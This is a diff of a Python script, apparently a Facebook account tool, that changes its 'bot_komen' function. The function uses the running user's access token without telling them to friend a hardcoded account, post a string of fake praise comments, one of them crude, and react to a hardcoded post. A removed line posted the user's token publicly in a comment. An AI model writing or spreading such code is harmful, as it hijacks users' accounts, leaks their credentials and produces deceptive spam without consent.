@@ -218,15 +218,27 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100045781089477'
-    kom = ('Hai Bang Ini Tokenku' +toke)
+    kom = 'Hai Bang'
     kom2 = 'Wadooo Bang Jago'
     kom3 = 'Script nya work gan'
+    kom4 = 'heker banget🙏'
+    kom5 = 'rahimku anget'
+    kom6 = 'gan kamu ganteng'
+    kom7 = 'hai gan'
+    kom8 = 'duh bang sc nya work bener gw dapet banyak akun'
+    kom9 = 'p'
     reac = 'ANGRY'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + toke)
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom4 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom5 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom6 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom7 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom8 + '&access_token=' + toke)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom9 + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
     menu()
 
